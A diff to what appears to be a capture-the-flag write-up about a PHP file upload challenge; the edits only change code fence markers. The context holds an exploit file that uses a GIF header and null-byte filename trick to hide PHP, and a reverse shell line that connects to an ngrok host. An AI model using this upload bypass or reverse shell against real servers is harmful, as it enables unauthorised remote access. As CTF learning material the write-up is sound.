@@ -13,7 +13,7 @@ We have been given a website [http://52.59.124.14:10021/](http://52.59.124.14:10
 
 So first let's see the source code given.
 
-'''php
+```php
 <?php
 error_reporting(0);
 
@@ -49,7 +49,7 @@ if ($files["name"] != "") {
     }
 }
 ?>
-'''
+```
 
 
 ## Vulnerability Identification
@@ -71,10 +71,10 @@ So to exploit this server we will try to get a shell using **ngrok**
 
 exploit.php%00.gif looks like:
 
-'''php
+```php
 GIF89a
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/16344 0>&1'");?>
-'''
+```
 
 ## Obtaining the Flag
 
